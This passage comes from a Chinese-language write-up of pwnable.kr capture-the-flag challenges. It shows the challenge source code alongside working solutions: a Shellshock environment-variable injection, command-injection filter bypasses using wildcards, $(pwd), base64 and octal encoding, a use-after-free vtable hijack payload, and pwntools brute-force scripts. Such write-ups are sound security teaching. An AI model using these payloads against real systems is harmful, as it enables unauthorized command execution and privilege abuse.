+<p>首先了解下<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZHk3MDAyL2FydGljbGUvZGV0YWlscy83Mjg1MjgyMg=="> ARM 函数调用约定</span>，其中，结果为一个 32 位的整数时，可以通过寄存器 R0 返回，根据汇编代码可以看出，r3 寄存器中的值传给了 r0，而 pc 的值又传给了 r3。</p>
+<p>再来了解下<span class="exturl" data-url="aHR0cHM6Ly9iYnMuaWNodW5xaXUuY29tL3RocmVhZC00MDQ5My0xLTEuaHRtbD9mcm9tPWJreWw="> pc 寄存器</span>，具体就不解释了不懂，大概就是</p>
+<p>ARM 模式下，pc = 当前指令地址 + 8；</p>
+<p>Thumb 模式下，pc = 当前指令 + 4</p>
+<p>而控制什么模式的就是一些带状态的指令，比如 bx addr，bx 就是带状态切换跳转指令，当 addr 的最后一位为 1 时，会将跳转地址处的代码解析为 Thumb 指令，最后一位为 0 的话，就解析成 ARM 指令。</p>
+<p>所以 key1=8cdc+8=8CE4‬</p>
+<p>(gdb) disass key2<br>
+Dump of assembler code for function key2:<br>
+0x00008cf0 &lt;+0&gt;:	push	{r11}		; (str r11, [sp, #-4]!)<br>
+0x00008cf4 &lt;+4&gt;:	add	r11, sp, #0<br>
+0x00008cf8 &lt;+8&gt;:	push	{r6}		; (str r6, [sp, #-4]!)<br>
+0x00008cfc &lt;+12&gt;:	add	r6, pc, #1<br>
+0x00008d00 &lt;+16&gt;:	bx	r6<br>
+0x00008d04 &lt;+20&gt;:	mov	r3, pc<br>
+0x00008d06 &lt;+22&gt;:	adds	r3, #4<br>
+0x00008d08 &lt;+24&gt;:	push	{r3}<br>
+0x00008d0a &lt;+26&gt;:	pop	{pc}<br>
+0x00008d0c &lt;+28&gt;:	pop	{r6}		; (ldr r6, [sp], #4)<br>
+0x00008d10 &lt;+32&gt;:	mov	r0, r3<br>
+0x00008d14 &lt;+36&gt;:	sub	sp, r11, #0<br>
+0x00008d18 &lt;+40&gt;:	pop	{r11}		; (ldr r11, [sp], #4)<br>
+0x00008d1c &lt;+44&gt;:	bx	lr<br>
+End of assembler dump.</p>
+<p>可以看到 pc 的值传给了 r3，r3 再与 4 相加，最后给 r0，这样的话 key2 的值就应该为 8D10‬，但是由于前面执行 bx r6 时 r6 最后一位为 1，所以执行后面代码时的模式是 Thumb 模式，所以 <code>mov r3, pc</code>  时 pc 的值为 8D08。</p>
+<p>key2=8d04+4+4=8D0C‬</p>
+<p>(gdb) disass key3<br>
+Dump of assembler code for function key3:<br>
+0x00008d20 &lt;+0&gt;:	push	{r11}		; (str r11, [sp, #-4]!)<br>
+0x00008d24 &lt;+4&gt;:	add	r11, sp, #0<br>
+0x00008d28 &lt;+8&gt;:	mov	r3, lr<br>
+0x00008d2c &lt;+12&gt;:	mov	r0, r3<br>
+0x00008d30 &lt;+16&gt;:	sub	sp, r11, #0<br>
+0x00008d34 &lt;+20&gt;:	pop	{r11}		; (ldr r11, [sp], #4)<br>
+0x00008d38 &lt;+24&gt;:	bx	lr<br>
+End of assembler dump.</p>
+<p>lr-&gt;r3-&gt;r0，lr 是寄存器 R14: 连接寄存器，记作 lr ; 它用于保存子程序的返回地址，返回地址就是调用函数下面那一句的地址</p>
+<p>0x00008d7c &lt;+64&gt;:	bl	0x8d20 <key3><br>
+0x00008d80 &lt;+68&gt;:	mov	r3, r0</p>
+<p>key3=8d80</p>
+<p><strong>key=key1+key2+key3=‭‭0x1A770‬=108400‬</strong></p>
+<h2 id="mistake"><a class="markdownIt-Anchor" href="#mistake">#</a> mistake</h2>
+<h3 id="题目描述-9"><a class="markdownIt-Anchor" href="#题目描述-9">#</a> 题目描述</h3>
+<p>hint:operator priority</p>
+<p>#include &lt;stdio.h&gt;<br>
+#include &lt;fcntl.h&gt;</p>
+<p>#define PW_LEN 10<br>
+#define XORKEY 1</p>
+<p>void xor(char* s, int len)<ruby>
+	int i;
+	for(i=0; i&lt;len; i++){
+		s[i] <rp>【</rp><rt> XORKEY;
+	</rt><rp>】</rp></ruby><br>
+}</p>
+<p>int main(int argc, char* argv[]){</p>
+<pre><code>int fd;
+if(fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0)&#123;
+	printf(&quot;can't open password %d\n&quot;, fd);
+	return 0;
+&#125;
+
+printf(&quot;do not bruteforce...\n&quot;);
+sleep(time(0)%20);
+
+char pw_buf[PW_LEN+1];
+int len;
+if(!(len=read(fd,pw_buf,PW_LEN) &gt; 0))&#123;
+	printf(&quot;read error\n&quot;);
+	close(fd);
+	return 0;		
+&#125;
+
+char pw_buf2[PW_LEN+1];
+printf(&quot;input password:&quot;);
+scanf(&quot;%10s&quot;, pw_buf2);
+
+// xor your input
+xor(pw_buf2, 10);
+
+if(!strncmp(pw_buf, pw_buf2, PW_LEN))&#123;
+	printf(&quot;Password OK\n&quot;);
+	system(&quot;/bin/cat flag\n&quot;);
+&#125;
+else&#123;
+	printf(&quot;Wrong Password\n&quot;);
+&#125;
+
+close(fd);
+return 0;
+</code></pre>
+<p>}</p>
+<h3 id="题目解析-9"><a class="markdownIt-Anchor" href="#题目解析-9">#</a> 题目解析</h3>
+<p>题目提示操作符优先级</p>
+<p>这题问题出在</p>
+<p>if(fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0){<br>
+printf(“can’t open password %d\n”, fd);<br>
+return 0;<br>
+}</p>
+<p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>&lt;</mo></mrow><annotation encoding="application/x-tex">&lt;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span></span></span></span> 优先级要比<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>=</mo></mrow><annotation encoding="application/x-tex">=</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span></span></span></span> 号高，所以会先判断 <code>open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0</code> ， <code>open</code>  函数读取成功文件描述符，必定大于 0，所以 <code>open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0</code>  整个式子的值就为 false (0)，也就是 fd=0。</p>
+<p>那么下面的 <code>read(fd,pw_buf,PW_LEN)</code>  其实就是从标准输入里面读取数据。</p>
+<p>当输入 1234567890，与 1 进行异或运算后可以得到 0325476981</p>
+<h2 id="shellshock"><a class="markdownIt-Anchor" href="#shellshock">#</a> shellshock</h2>
+<h3 id="题目描述-10"><a class="markdownIt-Anchor" href="#题目描述-10">#</a> 题目描述</h3>
+<p>Mommy, there was a shocking news about bash.</p>
+<p>I bet you already know, but lets just make it sure 😃</p>
+<p>ssh <span class="exturl" data-url="bWFpbHRvOnNoZWxsc2hvY2tAcHduYWJsZS5rcg==">shellshock@pwnable.kr</span> -p2222 (pw:guest)</p>
+<p>#include &lt;stdio.h&gt;<br>
+int main(){<br>
+setresuid(getegid(), getegid(), getegid());<br>
+setresgid(getegid(), getegid(), getegid());<br>
+system(&quot;/home/shellshock/bash -c ‘echo shock_me’&quot;);<br>
+return 0;<br>
+}</p>
+<h3 id="题目解析-10"><a class="markdownIt-Anchor" href="#题目解析-10">#</a> 题目解析</h3>
+<p>setresgid</p>
+<p>分别设置真实的，有效的和保存过的组标识号</p>
+<p>setresuid</p>
+<p>分别设置真实的，有效的和保存过的用户标识号</p>
+<p>再看一下权限</p>
+<p>shellshock@prowl:~$ ls -l<br>
+total 960<br>
+-r-xr-xr-x 1 root shellshock     959120 Oct 12  2014 bash<br>
+-r–r----- 1 root shellshock_pwn     47 Oct 12  2014 flag<br>
+-r-xr-sr-x 1 root shellshock_pwn   8547 Oct 12  2014 shellshock<br>
+-r–r--r-- 1 root root              188 Oct 12  2014 shellshock.c</p>
+<p>shellshock 文件所属组权限中有一个 s，而 s 的含义代表<strong> SGID (Set Group ID, 4)</strong></p>
+<ul>
+<li><strong>SGID(Set Group ID, 4):</strong></li>
+</ul>
+<p>对于可执行文件， <code>SGID</code>  与 <code>SUID</code>  类似，引发的进程的所有组是程序文件所属的组。对于目录， <code>SGID</code>  属性会使目录中新建文件的所属组与该目录相同。 <code>SGID</code>  也可以用 s 表示，如:</p>
+<p>$ ls -l /vardrwxrwsr-x  2 root staff    4096 Apr 10  2014 localdrwxrwxr-x 15 root syslog   4096 Apr  4 19:57 log</p>
+<p>也就是说 shellshock 运行时会得到 shellshock_pwn 的权限。</p>
+<p>权限得到了，但是程序中并没有可以得到 flag 的地方，所以就要利用到 shellshock 漏洞，漏洞产生原因是由于 bash 使用的环境变量是通过函数名称来调用的，以 “(){” 开头通过环境变量来定义的。而在处理这样的 “函数环境变量” 的时候，并没有以函数结尾 “}” 为结束，而是一直执行其后的 shell 命令，例如：</p>
+<p>env x=’() { :;}; echo vulnerable’ bash -c “echo this is a test”</p>
+<p>存在漏洞的 bash 版本会输出</p>
+<p>vulnerable<br>
+this is a test</p>
+<p>在后面加 <code>bash -c</code>  的原因是打开一个 bash 使其立即触发漏洞，因为当前 bash 没有继承环境变量。</p>
+<p>所以最终 payload：</p>
+<p>env x=’() { :;}; bash -c cat flag’ ./shellshock</p>
+<h4 id="参考文章"><a class="markdownIt-Anchor" href="#参考文章">#</a> 参考文章</h4>
+<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvc3lzdGVtLzQ1MzkwLmh0bWw=">https://www.freebuf.com/articles/system/45390.html</span></p>
+<p><span class="exturl" data-url="aHR0cDovL2Fpa2luLm1lLzIwMTUvMDQvMDMvbGludXgtZmlsZS1wZXJtaXNzaW9uLW93ZXIv">http://aikin.me/2015/04/03/linux-file-permission-ower/</span></p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N0YXJ0ZXI=">https://blog.csdn.net/starter</span>_/article/details/78164387</p>
+<h2 id="coin1"><a class="markdownIt-Anchor" href="#coin1">#</a> coin1</h2>
+<h3 id="题目描述-11"><a class="markdownIt-Anchor" href="#题目描述-11">#</a> 题目描述</h3>
+<pre><code>---------------------------------------------------
+-              Shall we play a game?              -
+---------------------------------------------------
+
+You have given some gold coins in your hand
+however, there is one counterfeit coin among them
+counterfeit coin looks exactly same as real coin
+however, its weight is different from real one
+real coin weighs 10, counterfeit coin weighes 9
+help me to find the counterfeit coin with a scale
+if you find 100 counterfeit coins, you will get reward :)
+FYI, you have 60 seconds.
+
+- How to play - 
+1. you get a number of coins (N) and number of chances (C)
+2. then you specify a set of index numbers of coins to be weighed
+3. you get the weight information
+4. 2~3 repeats C time, then you give the answer
+
+- Example -
+[Server] N=4 C=2 	# find counterfeit among 4 coins with 2 trial
+[Client] 0 1 		# weigh first and second coin
+[Server] 20			# scale result:20
+[Client] 3			# weigh fourth coin
+[Server] 10			# scale result:10
+[Client] 2 			# counterfeit coin is third!
+[Server] Correct!
+
+- Ready? starting in 3 sec... -
+</code></pre>
+<p>简单来说就是给一组硬币，其中有一个假硬币，真硬币重量 10，假的重量 9，在有限的次数中猜出来假的硬币是哪一个，可以通过输入 <code>0 1 2 3 4 .....</code>  来了解 <code>0 1 2 3 4 .....</code>  这一组硬币重量的综合。</p>
+<h3 id="题目解析-11"><a class="markdownIt-Anchor" href="#题目解析-11">#</a> 题目解析</h3>
+<p>利用二分查找可以很快得到答案</p>
+<p>from pwn import *</p>
+<p>r = remote(“<span class="exturl" data-url="aHR0cDovL3B3bmFibGUua3I=">pwnable.kr</span>”, 9007)</p>
+<p>for i in range(31):<br>
+print r.recvline()</p>
+<p>for i in range(100):<br>
+n_c = r.recvline()<br>
+# print n_c<br>
+N = int(n_c.split(&quot; “)[0][2:])<br>
+C = int(n_c.split(” &quot;)[1][2:])<br>
+print “[*]N=%d,C=%d” % (N, C)<br>
+left, right = 0, N<br>
+mid = int((left+right) / 2)<br>
+for i in range©:<br>
+payload = ’ '.join([str(i) for i in range(left, mid)])<br>
+r.sendline(payload)<br>
+weight = int(r.recvline())<br>
+if weight % 10 == 0:<br>
+left = mid<br>
+right = right<br>
+mid = int((right + left) / 2.0)<br>
+else:<br>
+left = left<br>
+right = mid<br>
+mid = int((left + right) / 2.0)<br>
+r.sendline(str(left))<br>
+print r.recvline()</p>
+<p>但是在本地执行脚本时由于网速问题，导致无法在 60s 内跑到第 100 次，所以要把脚本放到服务器上去执行。</p>
+<p>连上之前任意一道题目的 ssh，在 tmp 目录下写好脚本， <code>r = remote(&quot;pwnable.kr&quot;, 9007)</code>  改为 <code>r = remote(&quot;0.0.0.0&quot;,9007)</code>  即可。</p>
+<h2 id="blackjack"><a class="markdownIt-Anchor" href="#blackjack">#</a> blackjack</h2>
+<h3 id="题目描述-12"><a class="markdownIt-Anchor" href="#题目描述-12">#</a> 题目描述</h3>
+<p>Hey! check out this C implementation of blackjack game!<br>
+I found it online</p>
+<p><span class="exturl" data-url="aHR0cDovL2Nib2FyZC5jcHJvZ3JhbW1pbmcuY29tL2MtcHJvZ3JhbW1pbmcvMTE0MDIzLXNpbXBsZS1ibGFja2phY2stcHJvZ3JhbS5odG1s">http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html</span></p>
+<p>I like to give my flags to millionares.<br>
+how much money you got?</p>
+<p>Running at:nc <span class="exturl" data-url="aHR0cDovL3B3bmFibGUua3I=">pwnable.kr</span> 9009</p>
+<p>blackjack，又名 21 点，详见游戏规则</p>
+<p>大概就是赌谁的点大的游戏</p>
+<h3 id="题目解析-12"><a class="markdownIt-Anchor" href="#题目解析-12">#</a> 题目解析</h3>
+<p>原本以为是个正经的 pwn 题，但是看到后面发现是道源码审计题。</p>
+<p>主要问题出在 <code>betting</code>  函数中</p>
+<p>int betting() //Asks user amount to bet<br>
+{<br>
+printf(&quot;\n\nEnter Bet: $&quot;);<br>
+scanf(&quot;%d&quot;, &amp;bet);</p>
+<p>if (bet &gt; cash) //If player tries to bet more money than player has<br>
+{<br>
+printf(&quot;\nYou cannot bet more money than you have.&quot;);<br>
+printf(&quot;\nEnter Bet: “);<br>
+scanf(”%d&quot;, &amp;bet);<br>
+return bet;<br>
+}<br>
+else return bet;<br>
+} // End Function</p>
+<p>在判断 <code>bet &gt; cash</code>  之后，又进行了一次 scanf，并且没有进行判断，直接返回。所以第一次输入一个大于 500 的值，第二次再输入一个大于 1000000 的数就可以得到 flag。</p>
+<h2 id="lotto"><a class="markdownIt-Anchor" href="#lotto">#</a> lotto</h2>
+<h3 id="题目描述-13"><a class="markdownIt-Anchor" href="#题目描述-13">#</a> 题目描述</h3>
+<p>#include &lt;stdio.h&gt;<br>
+#include &lt;stdlib.h&gt;<br>
+#include &lt;string.h&gt;<br>
+#include &lt;fcntl.h&gt;</p>
+<p>unsigned char submit[6];</p>
+<p>void play(){</p>
+<pre><code>int i;
+printf(&quot;Submit your 6 lotto bytes:&quot;);
+fflush(stdout);
+
+int r;
+r = read(0, submit, 6);
+
+printf(&quot;Lotto Start!\n&quot;);
+//sleep(1);
+
+// generate lotto numbers
+int fd = open(&quot;/dev/urandom&quot;, O_RDONLY);
+if(fd==-1)&#123;
+	printf(&quot;error. tell admin\n&quot;);
+	exit(-1);
+&#125;
+unsigned char lotto[6];
+if(read(fd, lotto, 6) != 6)&#123;
+	printf(&quot;error2. tell admin\n&quot;);
+	exit(-1);
+&#125;
+for(i=0; i&lt;6; i++)&#123;
+	lotto[i] = (lotto[i] % 45) + 1;		// 1 ~ 45
+&#125;
+close(fd);
+
+// calculate lotto score
+int match = 0, j = 0;
+for(i=0; i&lt;6; i++)&#123;
+	for(j=0; j&lt;6; j++)&#123;
+		if(lotto[i] == submit[j])&#123;
+			match++;
+		&#125;
+	&#125;
+&#125;
+
+// win!
+if(match == 6)&#123;
+	system(&quot;/bin/cat flag&quot;);
+&#125;
+else&#123;
+	printf(&quot;bad luck...\n&quot;);
+&#125;
+</code></pre>
+<p>}</p>
+<p>void help(){<br>
+printf(&quot;- nLotto Rule -\n&quot;);<br>
+printf(“nlotto is consisted with 6 random natural numbers less than 46\n”);<br>
+printf(“your goal is to match lotto numbers as many as you can\n”);<br>
+printf(“if you win lottery for <em>1st place</em>, you will get reward\n”);<br>
+printf(“for more details, follow the link below\n”);<br>
+printf(“<span class="exturl" data-url="aHR0cDovL3d3dy5ubG90dG8uY28ua3IvY291bnNlbC5kbz9tZXRob2Q9cGxheWVyR3VpZGUjYnV5aW5nX2d1aWRlMDElNUNuJTVDbg==">http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n</span>”);<br>
+printf(“mathematical chance to win this game is known to be 1/8145060.\n”);<br>
+}</p>
+<p>int main(int argc, char* argv[]){</p>
+<pre><code>// menu
+unsigned int menu;
+
+while(1)&#123;
+
+	printf(&quot;- Select Menu -\n&quot;);
+	printf(&quot;1. Play Lotto\n&quot;);
+	printf(&quot;2. Help\n&quot;);
+	printf(&quot;3. Exit\n&quot;);
+
+	scanf(&quot;%d&quot;, &amp;menu);
+
+	switch(menu)&#123;
+		case 1:
+			play();
+			break;
+		case 2:
+			help();
+			break;
+		case 3:
+			printf(&quot;bye\n&quot;);
+			return 0;
+		default:
+			printf(&quot;invalid menu\n&quot;);
+			break;
+	&#125;
+&#125;
+return 0;
+</code></pre>
+<p>}</p>
+<h3 id="题目解析-13"><a class="markdownIt-Anchor" href="#题目解析-13">#</a> 题目解析</h3>
+<p>程序从 <code>/dev/urandom</code>  中读取 6 个字节随机数，与用户输入的数据进行对比，而问题就出在对比的地方</p>
+<pre><code>for(i=0; i&lt;6; i++)&#123;
+	for(j=0; j&lt;6; j++)&#123;
+		if(lotto[i] == submit[j])&#123;
+			match++;
+		&#125;
+	&#125;
+&#125;
+</code></pre>
+<p>程序写成了嵌套循环，结果导致只要有一次 lotto [i]==submit [j]，match++ 就可以加到 6，最后得到 flag。那么就随便挑个字符，然后爆破就行了。</p>
+<p>from pwn import *</p>
+<p>s=ssh(“lotto”,“<span class="exturl" data-url="aHR0cDovL3B3bmFibGUua3I=">pwnable.kr</span>”,2222,“guest”)<br>
+p=s.process(&quot;/home/lotto/lotto&quot;)<br>
+p.recv()<br>
+while True:<br>
+p.sendline(“1”)<br>
+p.recv()<br>
+payload=&quot;------&quot;<br>
+p.sendline(payload)<br>
+recv_str=p.recv()<br>
+if “bad luck…\n” not in recv_str:<br>
+print recv_str<br>
+break</p>
+<h2 id="cmd1"><a class="markdownIt-Anchor" href="#cmd1">#</a> cmd1</h2>
+<h3 id="题目描述-14"><a class="markdownIt-Anchor" href="#题目描述-14">#</a> 题目描述</h3>
+<p>#include &lt;stdio.h&gt;<br>
+#include &lt;string.h&gt;</p>
+<p>int filter(char* cmd){<br>
+int r=0;<br>
+r += strstr(cmd, “flag”)!=0;<br>
+r += strstr(cmd, “sh”)!=0;<br>
+r += strstr(cmd, “tmp”)!=0;<br>
+return r;<br>
+}<br>
+int main(int argc, char* argv[], char** envp){<br>
+putenv(“PATH=/thankyouverymuch”);<br>
+if(filter(argv[1])) return 0;<br>
+system( argv[1] );<br>
+return 0;<br>
+}</p>
+<h3 id="题目解析-14"><a class="markdownIt-Anchor" href="#题目解析-14">#</a> 题目解析</h3>
+<p>程序执行用户输入的命令，但是设置了一个不存在的 path 环境变量 <code>/thankyouverymuch</code> ，并且对输入进行了过滤，不能输入 sh，flag，tmp。</p>
+<p>环境变量部分只需要带上路径访问就可以，过滤部分则需要利用 linux 的通配符，或者可以将 &quot;flag&quot; 拆分开</p>
+<p>payload：</p>
+<p><code>./cmd1 &quot;/bin/cat fl*&quot;</code></p>
+<p>或者</p>
+<p><code>./cmd1 “/bin/cat \”f\”\”l\”\”a\”\”g\””</code></p>
+<h2 id="cmd2"><a class="markdownIt-Anchor" href="#cmd2">#</a> cmd2</h2>
+<h3 id="题目描述-15"><a class="markdownIt-Anchor" href="#题目描述-15">#</a> 题目描述</h3>
+<p>#include &lt;stdio.h&gt;<br>
+#include &lt;string.h&gt;</p>
+<p>int filter(char* cmd){<br>
+int r=0;<br>
+r += strstr(cmd, “=”)!=0;<br>
+r += strstr(cmd, “PATH”)!=0;<br>
+r += strstr(cmd, “export”)!=0;<br>
+r += strstr(cmd, “/”)!=0;<br>
+r += strstr(cmd, “`”)!=0;<br>
+r += strstr(cmd, “flag”)!=0;<br>
+return r;<br>
+}</p>
+<p>extern char** environ;<br>
+void delete_env(){<br>
+char** p;<br>
+for(p=environ; *p; p++)	memset(*p, 0, strlen(*p));<br>
+}</p>
+<p>int main(int argc, char* argv[], char** envp){<br>
+delete_env();<br>
+putenv(“PATH=/no_command_execution_until_you_become_a_hacker”);<br>
+if(filter(argv[1])) return 0;<br>
+printf(&quot;%s\n&quot;, argv[1]);<br>
+system( argv[1] );<br>
+return 0;<br>
+}</p>
+<h3 id="题目解析-15"><a class="markdownIt-Anchor" href="#题目解析-15">#</a> 题目解析</h3>
+<p>比起上一道题目难了许多，最麻烦的就是过滤了 /，不能再 <code>/bin/cat fl*</code> ，当然还是有办法绕过。</p>
+<ul>
+<li><strong>pwd 方式</strong><br>
+虽然因为程序设置了 PATH 导致无法执行很多命令，但是发现可以执行 pwd，有两种方法</li>
+</ul>
+<ol>
+<li>进入到根目录 <code>/</code> , 此时 pwd 返回的结果就是 <code>/</code> ，利用 <code>$(pwd)</code>  就可以得到 <code>/</code>  接着构造 payload：<br>
+ <code>/home/cmd2/cmd2 '$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)fl*'</code></li>
+<li>首先在 tmp 目录下创建目录 <code>/tmp/test/c</code> ，这样在此目录下执行 pwd 会得到 <code>/tmp/test/c</code> ，接着在 <code>/tmp/test</code>  目录下建立 cat 的软连接： <code>ln -s /bin/cat cat</code> ，在 <code>/tmp/test/c</code>  下建立 flag 的软连接： <code>ln -s /home/cmd2/flag flag</code> ，然后在 <code>/tmp/test/c</code>  目录下执行命令： <code>/home/cmd2/cmd2 &quot;$(pwd)at f*&quot;</code></li>
+</ol>
+<ul>
+<li>编码方式</li>
+</ul>
+<ol>
+<li>BASE64<br>
+ 首先将 <code>/bin/cat /home/cmd2/flag</code>  进行 base64 编码，得到 <code>L2Jpbi9jYXQgL2hvbWUvY21kMi9mbGFnCg==</code> ，但是因为有 =，所以需要在原来的字符串中插入两个空格，就不会有 = 了。<br>
+ <code>echo &quot;\57&quot;</code>  可以输出 <code>/</code> ，利用管道符进行解码，最后就可以得到 flag<br>
+ <code>./cmd2 '$(echo &quot;L2Jpbi9jYXQgL2hvbWUvY21kMi9mbGFnICAK&quot; | $(echo &quot;\57&quot;)usr$(echo &quot;\57&quot;)bin$(echo &quot;\57&quot;)base64 -d)'</code></li>
+<li>8 进制<br>
+算出 <code>/bin/cat flag</code> 8 进制代码，得到 <code>\057\0142\0151\0156\057\0143\0141\0164\040\0146\0154\0141\0147</code> ，接着执行 <code>./cmd2 '$(echo &quot;\057\0142\0151\0156\057\0143\0141\0164\040\0146\0154\0141\0147&quot;)'</code></li>
+</ol>
+<ul>
+<li>脑洞大开方式</li>
+</ul>
+<ol>
+<li>利用 read 写入环境变量并执行<br>
+执行 <code>./cmd2 &quot;read a;\$a&quot;</code> ，输入 <code>/bin/cat flag</code>  得到 flag<br>
+ <code>read a;</code>  写入一个 a 变量， <code>\$a</code>  转义 <code>$</code>  字符，执行 <code>$a</code>  变量。</li>
+<li>shell 内置函数 command 的参数 <code>-p</code></li>
+</ol>
+<p>./cmd2 &quot;command -p cat “f&quot;l&quot;a&quot;g”</p>
+<h2 id="uaf"><a class="markdownIt-Anchor" href="#uaf">#</a> uaf</h2>
+<h3 id="题目描述-16"><a class="markdownIt-Anchor" href="#题目描述-16">#</a> 题目描述</h3>
+<p>Mommy, what is Use After Free bug?</p>
+<p>#include &lt;fcntl.h&gt;<br>
+#include <iostream><br>
+#include <cstring><br>
+#include <cstdlib><br>
+#include &lt;unistd.h&gt;<br>
+using namespace std;</p>
+<p>class Human{<br>
+private:<br>
+virtual void give_shell(){<br>
+system(&quot;/bin/sh&quot;);<br>
+}<br>
+protected:<br>
+int age;<br>
+string name;<br>
+public:<br>
+virtual void introduce(){<br>
+cout &lt;&lt; &quot;My name is &quot; &lt;&lt; name &lt;&lt; endl;<br>
+cout &lt;&lt; “I am &quot; &lt;&lt; age &lt;&lt; &quot; years old” &lt;&lt; endl;<br>
+}<br>
+};</p>
+<p>class Man: public Human{<br>
+public:<br>
+Man(string name, int age){<br>
+this-&gt;name = name;<br>
+this-&gt;age = age;<br>
+}<br>
+virtual void introduce(){<br>
+Human::introduce();<br>
+cout &lt;&lt; “I am a nice guy!” &lt;&lt; endl;<br>
+}<br>
+};</p>
+<p>class Woman: public Human{<br>
+public:<br>
+Woman(string name, int age){<br>
+this-&gt;name = name;<br>
+this-&gt;age = age;<br>
+}<br>
+virtual void introduce(){<br>
+Human::introduce();<br>
+cout &lt;&lt; “I am a cute girl!” &lt;&lt; endl;<br>
+}<br>
+};</p>
+<p>int main(int argc, char* argv[]){<br>
+Human* m = new Man(“Jack”, 25);<br>
+Human* w = new Woman(“Jill”, 21);</p>
+<pre><code>size_t len;
+char* data;
+unsigned int op;
+while(1)&#123;
+	cout &lt;&lt; &quot;1. use\n2. after\n3. free\n&quot;;
+	cin &gt;&gt; op;
+
+	switch(op)&#123;
+		case 1:
+			m-&gt;introduce();
+			w-&gt;introduce();
+			break;
+		case 2:
+			len = atoi(argv[1]);
+			data = new char[len];
+			read(open(argv[2], O_RDONLY), data, len);
+			cout &lt;&lt; &quot;your data is allocated&quot; &lt;&lt; endl;
+			break;
+		case 3:
+			delete m;
+			delete w;
+			break;
+		default:
+			break;
+	&#125;
+&#125;
+
+return 0;	
+</code></pre>
+<p>}</p>
+<h3 id="题目解析-16"><a class="markdownIt-Anchor" href="#题目解析-16">#</a> 题目解析</h3>
+<p>这道题目很明显是 Use-After-Free (UAF) 漏洞，case3 中 <code>delete m;delete w</code> ，但是之后再 case1 中可以再调用 <code>m-&gt;introduce();w-&gt;introduce();</code> ，触发漏洞。</p>
+<p>首先了解下 C++ 虚函数</p>
+<p>虚函数，一旦一个类有虚函数，编译器会为这个类建立一张 vtable。子类继承父类 vtable 中所有项，当子类有同名函数时，修改 vtable 同名函数地址，改为指向子类的函数地址，子类有新的虚函数时，在 vtable 中添加。私有函数无法继承，但如果私有函数是虚函数，vtable 中会有相应的函数地址，所有子类可以通过手段得到父类的虚私有函数。</p>
+<p>调试得到 <code>give_shell</code>  地址后就需要想办法调用，这里就利用到 UAF</p>
+<p>但是利用之前需要控制被释放的空间里的内容，case2 中有 read 函数可以利用，但是并不能控制写往什么地址。这里就需要了解下<a target="_blank" rel="noopener" href="https://www.freebuf.com/news/88660.html"><strong> fastbin</strong></a></p>
+<p>fastbin 顾名思义，fast 就是要快。所以 fastbin 旨在加快操作系统的内存分配速度，fastbin 仅使用 fd 形成单链表的形式，且遵循 LIFO 原则。</p>
+<p>当操作系统分配一块较小的内存时 (64 字节)，会首先从从 fastbin 中寻找未使用的 chunk 并分配。</p>
+<p>w，m 对象的内存布局为</p>
+<p>±-----------+<br>
+|   vtable   |&lt;----------------+<br>
+±-----------+                 |<br>
+|    age     |        ±-----------------+<br>
+±-----------+        | human::give_shell|<br>
+|    name    |        ±-----------------+<br>
+±-----------+        |  man::introduce  |<br>
+^               ±-----------------+<br>
+|<br>
+±-----------+<br>
+|   “jack”   |<br>
+±-----------+</p>
+<p>大小为 24 字节，属于 fastbin。执行 delete 之后，如果 case2 中分配的空间大小为 24 字节，就可以重新分配到这一块内存区域。</p>
+<p><strong>payload</strong></p>
+<p>uaf@prowl:~$ python -c ‘print “\x48\x15\x40\x00\x00\x00\x00\x00”’&gt;/tmp/uaf_exp1<br>
+uaf@prowl:~$ ./uaf 24 /tmp/uaf_exp1</p>
+<ol>
+<li>use</li>
+<li>after</li>
+<li>free<br>
+3</li>
+<li>use</li>
+<li>after</li>
+<li>free<br>
+2<br>
+your data is allocated</li>
+<li>use</li>
+<li>after</li>
+<li>free<br>
+2          #分配两次，因为程序先 delete m, 后 delete w，只分配一次会先分配到 w 上面，而 case1 是先执行 m-&gt;introduce ()。<br>
+your data is allocated</li>
+<li>use</li>
+<li>after</li>
+<li>free<br>
+1<br>
+$ ls<br>
+flag  uaf  uaf.cpp<br>
+$ cat flag<br>
+yay_f1ag_aft3r_pwning</li>
+</ol>
+<h2 id="memcpy"><a class="markdownIt-Anchor" href="#memcpy">#</a> memcpy</h2>
+<h3 id="题目描述-17"><a class="markdownIt-Anchor" href="#题目描述-17">#</a> 题目描述</h3>
+<p>// compiled with:gcc -o memcpy memcpy.c -m32 -lm<br>
+#include &lt;stdio.h&gt;<br>
+#include &lt;string.h&gt;<br>
+#include &lt;stdlib.h&gt;<br>
+#include &lt;signal.h&gt;<br>
+#include &lt;unistd.h&gt;<br>
+#include &lt;sys/mman.h&gt;<br>
+#include &lt;math.h&gt;</p>
+<p>unsigned long long rdtsc(){<br>
+asm(“rdtsc”);<br>
+}</p>
+<p>char* slow_memcpy(char* dest, const char* src, size_t len){<br>
+int i;<br>
+for (i=0; i&lt;len; i++) {<br>
+dest[i] = src[i];<br>
+}<br>
+return dest;<br>
+}</p>
+<p>char* fast_memcpy(char* dest, const char* src, size_t len){<br>
+size_t i;<br>
+// 64-byte block fast copy<br>
+if(len &gt;= 64){<br>
+i = len / 64;<br>
+len &amp;= (64-1);<br>
+while(i-- &gt; 0){<br>
+<strong>asm</strong> <strong>volatile</strong> (<br>
+“movdqa (%0), %%xmm0\n”<br>
+“movdqa 16(%0), %%xmm1\n”<br>
